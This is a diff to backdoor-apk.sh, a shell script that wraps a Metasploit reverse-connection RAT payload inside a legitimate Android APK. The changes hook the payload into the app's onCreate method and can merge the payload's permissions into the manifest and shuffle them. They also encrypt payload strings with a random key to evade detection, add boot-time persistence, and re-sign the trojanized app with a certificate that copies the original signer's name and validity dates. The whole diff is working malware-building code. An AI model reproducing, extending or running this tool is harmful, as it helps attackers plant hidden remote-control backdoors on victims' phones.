@@ -2,8 +2,6 @@
 
 # file: backdoor-apk.sh
 
-# version: 0.1.7
-
 # usage: ./backdoor-apk.sh original.apk
 
 # Dana James Traversie
@@ -15,9 +13,12 @@
 #   required by other Linux distros as well.
 # apt-get install lib32z1 lib32ncurses5 lib32stdc++6
 
+VERSION="0.2.3"
+
 PAYLOAD=""
 LHOST=""
 LPORT=""
+PERM_OPT=""
 
 MSFVENOM=msfvenom
 DEX2JAR=d2j-dex2jar
@@ -25,17 +26,81 @@ UNZIP=unzip
 KEYTOOL=keytool
 JARSIGNER=jarsigner
 APKTOOL=apktool
-PROGUARD=third-party/proguard5.2.1/lib/proguard
-DX=third-party/android-sdk-linux/build-tools/23.0.3/dx
-ZIPALIGN=third-party/android-sdk-linux/build-tools/23.0.3/zipalign
+PROGUARD=third-party/proguard5.3.2/lib/proguard
+ASO=third-party/android-string-obfuscator/lib/aso
+DX=third-party/android-sdk-linux/build-tools/25.0.2/dx
+ZIPALIGN=third-party/android-sdk-linux/build-tools/25.0.2/zipalign
 # file paths and misc
 MY_PATH=`pwd`
 ORIG_APK_FILE=$1
 RAT_APK_FILE=Rat.apk
 LOG_FILE=$MY_PATH/run.log
 TIME_OF_RUN=`date`
+# for functions
+FUNC_RESULT=""
 
 # functions
+function find_smali_file {
+  # $1 = smali_file_to_hook
+  # $2 = android_class
+  if [ ! -f $1 ]; then
+    local index=2
+    local max=1000
+    local smali_file=""
+    while [ $index -lt $max ]; do
+      smali_file=$MY_PATH/original/smali_classes$index/$2.smali
+      if [ -f $smali_file ]; then
+        # found
+        FUNC_RESULT=$smali_file
+        return 0
+      else
+        let index=index+1
+      fi
+    done
+    # not found
+    return 1
+  else
+    FUNC_RESULT=$1
+    return 0
+  fi
+}
+
+function hook_smali_file {
+  # $1 = payload_tld
+  # $2 = payload_primary_dir
+  # $3 = payload_sub_dir
+  # $4 = smali_file_to_hook
+  local stop_hooking=0
+  local smali_file=$4
+  while [ $stop_hooking -eq 0 ]; do
+    sed -i '/invoke.*;->onCreate.*(Landroid\/os\/Bundle;)V/a \\n\ \ \ \ invoke-static \{p0\}, L'"$1"'\/'"$2"'\/'"$3"'\/a;->a(Landroid\/content\/Context;)V' $smali_file >>$LOG_FILE 2>&1
+    grep -B 2 "$1/$2/$3/a" $smali_file >>$LOG_FILE 2>&1
+    if [ $? == 0 ]; then
+      echo "The smali file was hooked successfully" >>$LOG_FILE 2>&1
+      FUNC_RESULT=$smali_file
+      return 0
+    else
+      echo "Failed to hook smali file" >>$LOG_FILE 2>&1
+      local super_android_class=`grep ".super" $smali_file |sed 's/.super L//g' |sed 's/;//g'`
+      if [ -z $super_android_class ]; then
+        let stop_hooking=stop_hooking+1
+      else
+        echo "Trying to hook super class: $super_android_class" >>$LOG_FILE 2>&1
+        smali_file=$MY_PATH/original/smali/$super_android_class.smali
+        echo "New smali file to hook: $smali_file" >>$LOG_FILE 2>&1
+        find_smali_file $smali_file $super_android_class
+        if [ $? != 0 ]; then
+          echo "Failed to find new smali file" >>$LOG_FILE 2>&1
+          let stop_hooking=stop_hooking+1
+        else
+          echo "Found new smali file" >>$LOG_FILE 2>&1
+        fi
+      fi
+    fi
+  done
+  return 1
+}
+
 function cleanup {
   echo "Forcing cleanup due to a failure or error state!" >>$LOG_FILE 2>&1
   bash cleanup.sh >>$LOG_FILE 2>&1
@@ -148,10 +213,32 @@ function get_lport {
   done
 }
 
+function get_perm_opt {
+  echo "[+] Android manifest permission options:"
+  PS3='[?] Please select an Android manifest permission option: '
+  options=("Keep original" "Merge with payload and shuffle")
+  select opt in "${options[@]}"
+  do
+    case $opt in
+      "Keep original")
+        PERM_OPT="KEEPO"
+        break
+        ;;
+      "Merge with payload and shuffle")
+        PERM_OPT="RANDO"
+        break
+        ;;
+      *)
+        echo "[!] Invalid option selected"
+        ;;
+    esac
+  done
+}
+
 function init {
   echo "Running backdoor-apk at $TIME_OF_RUN" >$LOG_FILE 2>&1
   print_ascii_art
-  echo "[*] Running backdoor-apk.sh v0.1.7 on $TIME_OF_RUN"
+  echo "[*] Running backdoor-apk.sh v$VERSION on $TIME_OF_RUN"
   consult_which $MSFVENOM
   consult_which $DEX2JAR
   consult_which $UNZIP
@@ -159,12 +246,14 @@ function init {
   consult_which $JARSIGNER
   consult_which $APKTOOL
   consult_which $PROGUARD
+  consult_which $ASO
   consult_which $DX
   consult_which $ZIPALIGN
   verify_orig_apk
   get_payload
   get_lhost
   get_lport
+  get_perm_opt
 }
 
 # kick things off
@@ -191,16 +280,6 @@ if [ $rc != 0 ] || [ ! -f $RAT_APK_FILE ]; then
   exit 1
 fi
 
-echo -n "[*] Decompiling RAT APK file..."
-$APKTOOL d -f -o $MY_PATH/payload $MY_PATH/$RAT_APK_FILE >>$LOG_FILE 2>&1
-rc=$?
-echo "done."
-if [ $rc != 0 ]; then
-  echo "[!] Failed to decompile RAT APK file"
-  cleanup
-  exit $rc
-fi
-
 echo -n "[*] Decompiling original APK file..."
 $APKTOOL d -f -o $MY_PATH/original $MY_PATH/$ORIG_APK_FILE >>$LOG_FILE 2>&1
 rc=$?
@@ -211,8 +290,8 @@ if [ $rc != 0 ]; then
   exit $rc
 fi
 
-echo -n "[*] Merging permissions of original and payload projects..."
 # build random hex placeholder value without openssl
+# used in various code that follows
 placeholder=''
 for i in `seq 1 4`; do
   rand_num=`shuf -i 1-2147483647 -n 1`
@@ -220,24 +299,42 @@ for i in `seq 1 4`; do
   placeholder="$placeholder$hex"
 done
 echo "placeholder value: $placeholder" >>$LOG_FILE 2>&1
-tmp_perms_file=$MY_PATH/perms.tmp
-original_manifest_file=$MY_PATH/original/AndroidManifest.xml
-payload_manifest_file=$MY_PATH/payload/AndroidManifest.xml
-merged_manifest_file=$MY_PATH/original/AndroidManifest.xml.merged
-grep "<uses-permission" $original_manifest_file >$tmp_perms_file
-grep "<uses-permission" $payload_manifest_file >>$tmp_perms_file
-grep "<uses-permission" $tmp_perms_file|sort|uniq >$tmp_perms_file.uniq
-mv $tmp_perms_file.uniq $tmp_perms_file
-sed "s/<uses-permission.*\/>/$placeholder/g" $original_manifest_file >$merged_manifest_file
-cat $merged_manifest_file|uniq > $merged_manifest_file.uniq
-mv $merged_manifest_file.uniq $merged_manifest_file
-sed -i "s/$placeholder/$(sed -e 's/[\&/]/\\&/g' -e 's/$/\\n/' $tmp_perms_file | tr -d '\n')/" $merged_manifest_file
-diff $original_manifest_file $merged_manifest_file >>$LOG_FILE 2>&1
-mv $merged_manifest_file $original_manifest_file
-echo "done."
 
-# cleanup payload directory after merging app permissions
-rm -rf $MY_PATH/payload >>$LOG_FILE 2>&1
+original_manifest_file=$MY_PATH/original/AndroidManifest.xml
+if [ "$PERM_OPT" == "RANDO" ]; then
+  echo -n "[*] Decompiling RAT APK file..."
+  $APKTOOL d -f -o $MY_PATH/payload $MY_PATH/$RAT_APK_FILE >>$LOG_FILE 2>&1
+  rc=$?
+  echo "done."
+  if [ $rc != 0 ]; then
+    echo "[!] Failed to decompile RAT APK file"
+    cleanup
+    exit $rc
+  fi
+  echo -n "[*] Merging permissions of original and payload projects..."
+  tmp_perms_file=$MY_PATH/perms.tmp
+  payload_manifest_file=$MY_PATH/payload/AndroidManifest.xml
+  merged_manifest_file=$MY_PATH/original/AndroidManifest.xml.merged
+  grep "<uses-permission" $original_manifest_file >$tmp_perms_file
+  grep "<uses-permission" $payload_manifest_file >>$tmp_perms_file
+  grep "<uses-permission" $tmp_perms_file|sort|uniq|shuf >$tmp_perms_file.uniq
+  mv $tmp_perms_file.uniq $tmp_perms_file
+  sed "s/<uses-permission.*\/>/$placeholder/g" $original_manifest_file >$merged_manifest_file
+  awk '/^[ \t]*'"$placeholder"'/&&c++ {next} 1' $merged_manifest_file >$merged_manifest_file.uniq
+  mv $merged_manifest_file.uniq $merged_manifest_file
+  sed -i "s/$placeholder/$(sed -e 's/[\&/]/\\&/g' -e 's/$/\\n/' $tmp_perms_file | tr -d '\n')/" $merged_manifest_file
+  diff $original_manifest_file $merged_manifest_file >>$LOG_FILE 2>&1
+  mv $merged_manifest_file $original_manifest_file
+  echo "done."
+  # cleanup payload directory after merging app permissions
+  rm -rf $MY_PATH/payload >>$LOG_FILE 2>&1
+elif [ "$PERM_OPT" == "KEEPO" ]; then
+  echo "[+] Keeping permissions of original project"
+else
+  echo "[!] Something went terribly wrong..."
+  cleanup
+  exit 1
+fi
 
 # use dex2jar, proguard, and dx
 # to shrink, optimize, and obfuscate original Rat.apk code
@@ -355,16 +452,41 @@ fi
 echo -n "[*] Obfuscating const-string values in RAT smali files..."
 cat >$MY_PATH/obfuscate.method <<EOL
 
-    invoke-static {###REG###}, L###CLASS###;->a(Ljava/lang/String;)Ljava/lang/String;
+    invoke-static {###REG###}, L###CLASS###;->b(Ljava/lang/String;)Ljava/lang/String;
 
     move-result-object ###REG###
 EOL
-helper_class=`ls $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali |grep -v "AppBoot" |grep -v "MainService" |sort -r |head -n 1 |sed "s:$MY_PATH/original/smali/::g" |sed "s:.smali::g"`
-echo "Helper class: $helper_class" >>$LOG_FILE 2>&1
+stringobfuscator_class=`ls $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali |grep -v "AppBoot" |grep -v "MainService" |sort -r |head -n 1 |sed "s:$MY_PATH/original/smali/::g" |sed "s:.smali::g"`
+echo "StringObfuscator class: $stringobfuscator_class" >>$LOG_FILE 2>&1
+so_class_suffix=`echo $stringobfuscator_class |awk -F "/" '{ printf "%s.smali", $4 }'`
+echo "StringObfuscator class suffix: $so_class_suffix" >>$LOG_FILE 2>&1
+so_default_key="7IPR19mk6hmUY+hdYUaCIw=="
+so_key=$so_default_key
+which openssl >>$LOG_FILE 2>&1
+rc=$?
+if [ $rc == 0 ]; then
+  so_key="$(openssl rand -base64 16)"
+  rc=$?
+fi
+if [ $rc == 0 ]; then
+  file="$MY_PATH/original/smali/$stringobfuscator_class.smali"
+  sed -i 's%'"$so_default_key"'%'"$so_key"'%' $file >>$LOG_FILE 2>&1
+  rc=$?
+  if [ $rc == 0 ]; then
+    echo "Injected new key into StringObufscator class" >>$LOG_FILE 2>&1
+  else
+    echo "Failed to inject new key into StringObfuscator class, using default key" >>$LOG_FILE 2>&1
+    so_key=$so_default_key
+  fi
+else
+  echo "Failed to generate a new StringObfuscator key, using default key" >>$LOG_FILE 2>&1
+  so_key=$so_default_key 
+fi
+echo "StringObfuscator key: $so_key" >>$LOG_FILE 2>&1
 sed -i 's/[[:space:]]*"$/"/g' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali >>$LOG_FILE 2>&1
 rc=$?
 if [ $rc == 0 ]; then
-  grep "const-string" $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali |while read -r line; do
+  grep "const-string" --exclude="$so_class_suffix" $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali |while read -r line; do
     file=`echo $line |awk -F ": " '{ print $1 }'`
     echo "File: $file" >>$LOG_FILE 2>&1
     target=`echo $line |awk -F ", " '{ print $2 }'`
@@ -372,30 +494,40 @@ if [ $rc == 0 ]; then
     tmp=`echo $line |awk -F ": " '{ print $2 }'`
     reg=`echo $tmp |awk '{ print $2 }' |sed 's/,//'`
     echo "Reg: $reg" >>$LOG_FILE 2>&1
-    replacement=`echo $target |tr '[A-Za-z]' '[N-ZA-Mn-za-m]'`
+    stripped_target=`sed -e 's/^"//' -e 's/"$//' <<<"$target"`
+    replacement=`$ASO e "$stripped_target" k "$so_key"`
+    rc=$?
+    if [ $rc != 0 ]; then
+      echo "Failed to obfuscate target value" >>$LOG_FILE 2>&1
+      touch $MY_PATH/obfuscate.error
+      break
+    fi
+    replacement="\"$(echo $replacement)\""
     echo "Replacement: $replacement" >>$LOG_FILE 2>&1
     sed -i 's%'"$target"'%'"$replacement"'%' $file >>$LOG_FILE 2>&1
     rc=$?
     if [ $rc != 0 ]; then
+      echo "Failed to replace target value" >>$LOG_FILE 2>&1
       touch $MY_PATH/obfuscate.error
       break
     fi
     sed -i '\|'"$replacement"'|r '"$MY_PATH"'/obfuscate.method' $file >>$LOG_FILE 2>&1
     rc=$?
     if [ $rc != 0 ]; then
+      echo "Failed to inject unobfuscate method call" >>$LOG_FILE 2>&1
       touch $MY_PATH/obfuscate.error
       break
     fi
     sed -i 's/###REG###/'"$reg"'/' $file >>$LOG_FILE 2>&1
     rc=$?
     if [ $rc != 0 ]; then
+      echo "Failed to inject register value" >>$LOG_FILE 2>&1
       touch $MY_PATH/obfuscate.error
       break
     fi
   done
   if [ ! -f $MY_PATH/obfuscate.error ]; then
-    #class="$payload_tld/$payload_primary_dir/$payload_sub_dir/e"
-    class="$helper_class"
+    class="$stringobfuscator_class"
     sed -i 's|###CLASS###|'"$class"'|' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali
     rc=$?
   else
@@ -429,21 +561,28 @@ else
   tmp=$android_target_activity
 fi
 echo "Value of tmp: $tmp" >>$LOG_FILE 2>&1
-smali_file_to_hook=$MY_PATH/original/smali/$tmp.smali
-if [ ! -f $smali_file_to_hook ]; then
-  smali_file_to_hook=$MY_PATH/original/smali/$total_package$tmp.smali
+# add package from manifest if needed
+if [[ $tmp == /* ]]; then
+  tmp=$total_package$tmp
 fi
-echo "The smali file to hook: $smali_file_to_hook" >>$LOG_FILE 2>&1
-echo "done."
-if [ ! -f $smali_file_to_hook ]; then
+android_class=$tmp
+echo "Value of android_class: $android_class" >>$LOG_FILE 2>&1
+smali_file_to_hook=$MY_PATH/original/smali/$android_class.smali
+find_smali_file $smali_file_to_hook $android_class
+rc=$?
+if [ $rc != 0 ]; then
+  echo "done."
   echo "[!] Failed to locate smali file to hook"
   cleanup
-  exit 1
+  exit $rc
+else
+  echo "done."
+  smali_file_to_hook=$FUNC_RESULT
+  echo "The smali file to hook: $smali_file_to_hook" >>$LOG_FILE 2>&1
 fi
 
 echo -n "[*] Adding hook in original smali file..."
-sed -i '/invoke.*;->onCreate.*(Landroid\/os\/Bundle;)V/a \\n\ \ \ \ invoke-static \{p0\}, L'"$payload_tld"'\/'"$payload_primary_dir"'\/'"$payload_sub_dir"'\/a;->a(Landroid\/content\/Context;)V' $smali_file_to_hook >>$LOG_FILE 2>&1
-grep -B 2 "$payload_tld/$payload_primary_dir/$payload_sub_dir/a" $smali_file_to_hook >>$LOG_FILE 2>&1
+hook_smali_file $payload_tld $payload_primary_dir $payload_sub_dir $smali_file_to_hook
 rc=$?
 echo "done."
 if [ $rc != 0 ]; then
@@ -452,7 +591,6 @@ if [ $rc != 0 ]; then
   exit $rc
 fi
 
-echo -n "[*] Adding persistence hook in original project..."
 cat >$MY_PATH/persistence.hook <<EOL
         <receiver android:name="${payload_tld}.${payload_primary_dir}.${payload_sub_dir}.AppBoot">
             <intent-filter>
@@ -461,21 +599,31 @@ cat >$MY_PATH/persistence.hook <<EOL
         </receiver>
         <service android:exported="true" android:name="${payload_tld}.${payload_primary_dir}.${payload_sub_dir}.MainService"/>
 EOL
-sed -i '0,/<\/activity>/s//<\/activity>\n'"$placeholder"'/' $original_manifest_file >>$LOG_FILE 2>&1
+
+grep "android.permission.RECEIVE_BOOT_COMPLETED" $original_manifest_file >>$LOG_FILE 2>&1
 rc=$?
 if [ $rc == 0 ]; then
-  sed -i '/'"$placeholder"'/r '"$MY_PATH"'/persistence.hook' $original_manifest_file >>$LOG_FILE 2>&1
+  echo -n "[*] Adding persistence hook in original project..."
+  sed -i '0,/<\/activity>/s//<\/activity>\n'"$placeholder"'/' $original_manifest_file >>$LOG_FILE 2>&1
   rc=$?
   if [ $rc == 0 ]; then
-    sed -i '/'"$placeholder"'/d' $original_manifest_file >>$LOG_FILE 2>&1
+    sed -i '/'"$placeholder"'/r '"$MY_PATH"'/persistence.hook' $original_manifest_file >>$LOG_FILE 2>&1
     rc=$?
+    if [ $rc == 0 ]; then
+      sed -i '/'"$placeholder"'/d' $original_manifest_file >>$LOG_FILE 2>&1
+      rc=$?
+    fi
   fi
-fi
-echo "done."
-if [ $rc != 0 ]; then
-  echo "[!] Failed to add persistence hook"
-  cleanup
-  exit $rc
+  echo "done."
+  if [ $rc != 0 ]; then
+    echo "[!] Failed to add persistence hook"
+    cleanup
+    exit $rc
+  fi
+else
+  echo "[+] Unable to add persistence hook due to missing permission"
+  ##### TODO #####
+  # Delete AppBoot.smali and MainService.smali before recompilation?
 fi
 
 echo -n "[*] Recompiling original project with backdoor..."
@@ -492,13 +640,36 @@ keystore=$MY_PATH/signing.keystore
 compiled_apk=$MY_PATH/original/dist/$ORIG_APK_FILE
 unaligned_apk=$MY_PATH/original/dist/unaligned.apk
 
-orig_rsa_cert=`$UNZIP -l $ORIG_APK_FILE |grep ".RSA" |awk ' { print $4 } '`
-dname=`$UNZIP -p $ORIG_APK_FILE $orig_rsa_cert |$KEYTOOL -printcert |head -n 1 |sed 's/^.*: CN=/CN=/g'`
-echo "dname value: $dname" >>$LOG_FILE 2>&1
+dname=`$KEYTOOL -J-Duser.language=en -printcert -jarfile $ORIG_APK_FILE |grep -m 1 "Owner:" |sed 's/^.*: //g'`
+echo "Original dname value: $dname" >>$LOG_FILE 2>&1
+
+valid_from_line=`$KEYTOOL -J-Duser.language=en -printcert -jarfile $ORIG_APK_FILE |grep -m 1 "Valid from:"`
+echo "Original valid from line: $valid_from_line" >>$LOG_FILE 2>&1
+from_date=$(sed 's/^Valid from://g' <<< $valid_from_line |sed 's/until:.\+$//g' |sed 's/^[[:space:]]*//g' |sed 's/[[:space:]]*$//g')
+echo "Original from date: $from_date" >>$LOG_FILE 2>&1
+from_date_tz=$(awk '{ print $5 }' <<< $from_date)
+from_date_norm=$(sed 's/[[:space:]]'"$from_date_tz"'//g' <<< $from_date)
+echo "Normalized from date: $from_date_norm" >>$LOG_FILE 2>&1
+to_date=$(sed 's/^Valid from:.\+until://g' <<< $valid_from_line |sed 's/^[[:space:]]*//g' |sed 's/[[:space:]]*$//g')
+echo "Original to date: $to_date" >>$LOG_FILE 2>&1
+to_date_tz=$(awk '{ print $5 }' <<< $to_date)
+to_date_norm=$(sed 's/[[:space:]]'"$to_date_tz"'//g' <<< $to_date)
+echo "Normalized to date: $to_date_norm" >>$LOG_FILE 2>&1
+from_date_str=`TZ=UTC date --date="$from_date_norm" +"%Y/%m/%d %T"`
+echo "Value of from_date_str: $from_date_str" >>$LOG_FILE 2>&1
+end_ts=$(TZ=UTC date -ud "$to_date_norm" +'%s')
+start_ts=$(TZ=UTC date -ud "$from_date_norm" +'%s')
+validity=$(( ( (${end_ts} - ${start_ts}) / (60*60*24) ) ))
+echo "Value of validity: $validity" >>$LOG_FILE 2>&1
 
 echo -n "[*] Generating RSA key for signing..."
-$KEYTOOL -genkey -noprompt -alias signing.key -dname "$dname" -keystore $keystore -storepass android -keypass android -keyalg RSA -keysize 2048 -validity 10000 >>$LOG_FILE 2>&1
+$KEYTOOL -genkey -noprompt -alias signing.key -startdate "$from_date_str" -validity $validity -dname "$dname" -keystore $keystore -storepass android -keypass android -keyalg RSA -keysize 2048 >>$LOG_FILE 2>&1
 rc=$?
+if [ $rc != 0 ]; then
+  echo "Retrying RSA key generation without original APK cert from date and validity values" >>$LOG_FILE 2>&1
+  $KEYTOOL -genkey -noprompt -alias signing.key -validity 10000 -dname "$dname" -keystore $keystore -storepass android -keypass android -keyalg RSA -keysize 2048 >>$LOG_FILE 2>&1
+  rc=$?
+fi
 echo "done."
 if [ $rc != 0 ]; then
   echo "[!] Failed to generate RSA key"
